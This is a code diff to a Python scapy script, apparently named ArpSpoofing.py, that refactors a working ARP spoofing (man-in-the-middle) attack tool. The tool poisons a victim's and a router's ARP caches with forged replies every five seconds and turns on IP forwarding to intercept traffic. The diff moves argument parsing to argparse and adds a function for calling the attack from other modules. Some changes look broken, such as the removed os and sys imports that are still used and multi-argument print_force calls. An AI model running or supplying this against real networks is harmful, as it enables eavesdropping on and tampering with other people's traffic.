@@ -1,6 +1,4 @@
-import os
-import sys
-import getopt
+import argparse
 import regex
 from scapy.all import *
 from scapy.layers.l2 import arping
@@ -18,7 +16,7 @@ victimMAC = None
 routerMAC = None
 
 
-def print_f(string):
+def print_force(string):
     """This method is required because when this python file is called as a script
     the prints don't appear and a flush is required """
 
@@ -29,7 +27,7 @@ def print_f(string):
 def grab_MAC(IP):
     """Manipulates the packet layers to obtain the MAC address from the returned values"""
 
-    ans, uans = arping(IP)
+    ans, uans = arping(IP, verbose=scapyVerbose)
     for s, r in ans:
         return r[Ether].src
 
@@ -44,11 +42,11 @@ def grab_MAC_Addresses():
 
     if victimMAC is not None and routerMAC is not None:
         loop = False
-        print_f("[*] MAC Addresses obtain successfully!")
-        print("[*] Router mac: \'", routerMAC, '\'')
-        print("[*] Victim mac: \'", victimMAC, '\'')
+        print_force("[!] MAC Addresses obtain successfully!")
+        print_force("[*] Router mac: \'", routerMAC, '\'')
+        print_force("[*] Victim mac: \'", victimMAC, '\'')
     else:
-        exit("[!] Error obtaining MAC Addresses, trying again!")
+        exit("[!] Error obtaining MAC Addresses, Arp spoofing stopped!")
 
 
 def spoof(routerIP, victimIP):
@@ -57,7 +55,7 @@ def spoof(routerIP, victimIP):
     # Sends the arp replies
     #   "op = 2" - '2' is the opcode for a reply
 
-    print_f("[*] Spoofing")
+    print_force("[*] Spoofing")
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)
 
@@ -91,26 +89,36 @@ def set_ip_forward(state):
 def run():
     """Main loop method"""
 
-    grab_MAC_Addresses()
-    set_ip_forward(True)
+    try:
+        grab_MAC_Addresses()
+        set_ip_forward(True)
 
-    while True:
-        try:
+        while True:
             spoof(routerIP, victimIP)
             time.sleep(5)
 
-        except KeyboardInterrupt:
-            print("\n[*] Spoofing stopped!")
-            restore(routerIP, victimIP)
-            set_ip_forward(False)
-            sys.exit(0)
+    except KeyboardInterrupt:
+        print_force("\n[!] Spoofing stopped!")
+        restore(routerIP, victimIP)
+        set_ip_forward(False)
+        sys.exit(0)
+
+
+def arp_spoof_external(inter, victim, router):
+    """This allows this script to be run from another module"""
+
+    global interface, victimIP, routerIP
+
+    interface = inter
+    victimIP = victim
+    routerIP = router
+
+    run()
 
 
 def valid_ip(ip_address):
     """This function uses regex to check if the IP address parameters are correct.
     It validates the range 0.0.0.0 -> 255.255.255.255"""
-
-    print("Checking ip: ", ip_address)
 
     # Regular expression pattern matching for IP addresses
     pattern = \
@@ -118,7 +126,7 @@ def valid_ip(ip_address):
 
     # Pattern match
     if not regex.match(pattern, ip_address):
-        print("[*] Error: Invalid IP please check your parameters!")
+        print_force("[!] Error: Invalid IP please check your parameters!")
         sys.exit(1)
 
 
@@ -128,52 +136,36 @@ def parameters():
     global victimIP
     global routerIP
     global interface
+    global scapyVerbose
 
-    opts, args = getopt.getopt(sys.argv[1:], 'i:v:r:h', '')
-    for opt, arg in opts:
-        try:
-            if opt == "-i":
-                interface = arg
-            elif opt == "-v":
-                victimIP = arg
-            elif opt == "-r":
-                routerIP = arg
-            elif opt == "-h":
-                usage()
-                sys.exit(0)
-        except getopt.GetoptError:
-            print("Error: incorrect parameters")
-            usage()
-            sys.exit(2)
+    parser = argparse.ArgumentParser(prog="ArpSpoofing.py")
+    parser.add_argument('-t', action='store', help='Specifies the target IP', metavar='Target_IP', required=True)
+    parser.add_argument('-r', action='store', help='Specifies the router IP', metavar='Router_IP',  required=True)
+    parser.add_argument('-i', action='store', help='Specifies the interface', metavar='Interface', required=True)
+    parser.add_argument('-v', action='store_true', help='Sets the verbosity mode to on')
+    args = parser.parse_args()
+
+    if args.t:
+        victimIP = args.t
+    if args.r:
+        routerIP = args.r
+    if args.i:
+        interface = args.i
+    if args.v:
+        scapyVerbose = 1
 
     # Validation
     valid_ip(victimIP)
     valid_ip(routerIP)
 
-    # Validation for parameter
-    if victimIP == "" or routerIP == "" or interface == "":
-        print("\nError: Invalid parameters passed, a routerIP, victimIP and interface need to be passed")
-        usage()
-        sys.exit(1)
-
-
-def usage():
-    """Issues a terminal help message"""
-
-    print("""
-        Options:
-        #=================================================#
-        | -h                             - Help           |
-        | -v <IP_Address>                - Victim IP      |
-        | -r <IP_Address>                - Router IP      |
-        | -i <Interface_name>            - Interface      |
-        #=================================================#
-        """)
+    print_force('[*] Arp Spoofing beginning!')
+    run()
 
 
 # Check if user is root
 if os.getuid() != 0:
     exit("Error: User needs to be root to run this script")
 
-parameters()
-run()
+
+if __name__ == "__main__":
+    parameters()
